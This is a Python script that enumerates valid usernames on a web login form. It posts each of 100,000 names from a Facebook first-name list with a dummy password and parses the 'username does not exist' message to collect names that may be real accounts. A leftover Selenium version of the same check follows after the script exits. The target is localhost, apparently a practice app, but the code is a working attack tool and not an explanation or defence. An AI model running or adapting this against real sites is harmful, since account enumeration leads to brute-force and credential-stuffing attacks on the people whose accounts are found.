# import selenium
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
from time import sleep

import requests
import json
from bs4 import BeautifulSoup

with open('facebook-firstnames-first-100k.txt') as f:
    usernames = [line.rstrip() for line in f]

print(usernames[0:5])

url = 'http://localhost:5000/login'
print(f'Making POST requests to {url}')

possibly_worked = []

for username in usernames:
    data = {
        'username': username,
        'password': 'probablynotarealpassword'
    }

    res = requests.post(url, data=data)

    if res.status_code > 299:
        print(f'Received non-2XX status code: {res.status_code}')
        print('This may or may not mean success')
        possibly_worked.append(username)
        continue

    soup = BeautifulSoup(res.text, 'html.parser')
    alerts = soup.findAll('div', {'class': 'alert alert-info'})

    if len(alerts) < 1:
        print('The alert for incorrect username not found')
        print('This may or may not mean success')
        possibly_worked.append(username)
        continue

    alert = alerts[0]

    try:
        alert_text = alert.contents[2].strip().lower()
    except Exception as e:
        print('An exception occurred:')
        print(e)
        print('This may or may not mean success')
        possibly_worked.append(username)
        continue

    if 'username does not exist' not in alert_text:
        print('The alert exists but is not an alert about the username not existing')
        print('This may or may not mean success')
        possibly_worked.append(username)
    else:
        print(f'Username "{username}" not present.')

if len(possibly_worked) < 1:
    print('No possibly working usernames found.')
    exit(1)

print()
print()
print('The following usernames might work:')
for username in possibly_worked:
    print(username)

print('\nExiting.')
exit(0)


driver = webdriver.Chrome()
print(driver)
driver.get('http://localhost:5000/login')

username = 'my_username'

login_field = driver.find_element_by_name('username')
print(login_field)
login_field.send_keys(username)
login_field.send_keys(Keys.ENTER)

# login_btn = driver.find_element_by_class_name('btn')
# print(login_btn)
# login_btn.click()

sleep(2)

try:
    alert = driver.find_element_by_class_name('alert alert-info')
    print(alert)
    # TODO Check that the alert has the text for username not found,
    # as maybe the alert is reused if password does not match
except NoSuchElementException:
    print('The alert for incorrect username not found')
    print('This may or may not mean success')
    print('Press ENTER to continue execution')
    input()
except Exception as e:
    print('An exception occurred:')
    print(e)
    print('This may or may not mean success')
    print('Press ENTER to continue execution')
    input()

driver.quit()
exit(0)
